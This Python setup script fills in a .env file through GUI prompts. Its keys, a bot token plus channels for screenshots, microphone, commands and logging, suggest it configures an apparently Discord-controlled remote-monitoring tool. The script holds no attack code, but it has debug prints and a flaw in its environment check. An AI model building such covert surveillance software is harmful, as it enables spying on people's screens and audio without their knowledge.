import os, easygui, time
from dotenv import load_dotenv
load_dotenv()

keys = ['TOKEN', 'LOGGER_CHANNEL_ID', 'SERVER_ID', 'SCREENSHOT_CHANNEL_ID', 'MICROPHONE_CHANNEL_ID', 'COMMANDS_CHANNEL_ID', 'STATUS_CHANNEL_ID']

def exists_false():
    print("exists flase")
    global keys
    req = []
    for i in keys:
        if os.getenv(i) == 'NONE':
            req.append(i)
    
    for i in req:
        key = easygui.enterbox(f"THIS PROGRAM IS MISSING: {i}.\nPLEASE ENTER IT HERE:")

        with open(".env", "r") as file, open('.env.temp', "w") as temp:
            for line in file:
                if line.strip() == f"{i}='NONE'":
                    temp.write(f"{i}='{key}'\n")
                else:
                    temp.write(line)
        os.replace('.env.temp', ".env")

if __name__ == "__main__":
    while True:
        if os.path.exists(".env"):
            print("while, if")
            time.sleep(4)
            if os.getenv('TOKEN') != "NONE" and os.getenv('LOGGER_CHANNEL_ID') != "NONE" and os.getenv('SERVER_ID') != "NONE" and os.getenv('SCREENSHOT_CHANNEL_ID') != "NONE" and os.getenv('MICROPHONE_CHANNEL_ID') != "NONE" and os.getenv('COMMANDS_CHANNEL_ID') != "NONE" and os.getenv('STATUS_CHANNEL_ID') != "NONE":
                break
            else:
                print("while, if, else")
                exists_false()
                os.remove(".caller")
                break
        else:
            print("while, else")
            with open(".env", "w") as env_file:
                for key in keys:
                    env_file.write(f"{key}='NONE'\n")